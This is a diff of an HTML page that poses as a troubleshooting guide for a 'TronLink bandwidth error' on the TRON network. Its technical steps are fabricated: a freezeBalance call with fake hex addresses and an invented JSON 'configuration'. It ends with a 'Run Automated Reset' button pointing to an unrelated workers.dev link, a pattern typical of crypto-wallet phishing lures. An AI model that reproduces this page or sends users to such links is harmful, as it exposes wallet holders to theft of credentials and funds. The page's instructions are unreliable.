@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: BlinkMacSystemFont;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -41,33 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON ecosystem, resulting in failed or stalled operations.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or stalled operations.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to execute transactions and interact with smart contracts on the network.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to execute transactions and interact with the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens, which can be done through the TronLink wallet interface or using the following commands:</li>
-<li>Freeze 10000 TRX to obtain a significant amount of bandwidth</li>
-<li>Unfreeze TRX after a certain period to regain control over the tokens</li>
-<li>Monitor bandwidth and energy levels regularly to avoid depletion</li>
+<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
+<li>Adjust the transaction parameters to optimize energy consumption, such as reducing the transaction size or gas limit.</li>
+<li>Utilize the following JSON configuration to update the account's bandwidth parameters:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
-<span class="w">  </span><span class="s2">&quot;10000&quot;</span>,
-<span class="w">  </span><span class="m">3</span>,
-<span class="w">  </span><span class="s2">&quot;0x42567b352532a56b6524352365&quot;</span>,
-<span class="w">  </span><span class="s2">&quot;0x42567b352532a56b6524352365&quot;</span>
-<span class="o">)</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_tron_address&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;frozen_amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;frozen_duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex operations. </p>
+<p>Consider using an external console to execute these commands for more flexibility.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON-based wallet (e.g., TronLink) installed and configured</li>
-<li>A basic understanding of TRON's bandwidth and energy mechanisms</li>
-<li>Sufficient TRX tokens to freeze for bandwidth allocation</li>
+<li>A TRON account with sufficient TRX balance.</li>
+<li>The TRONLink extension installed and configured.</li>
+<li>A basic understanding of TRON's bandwidth and energy mechanisms.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
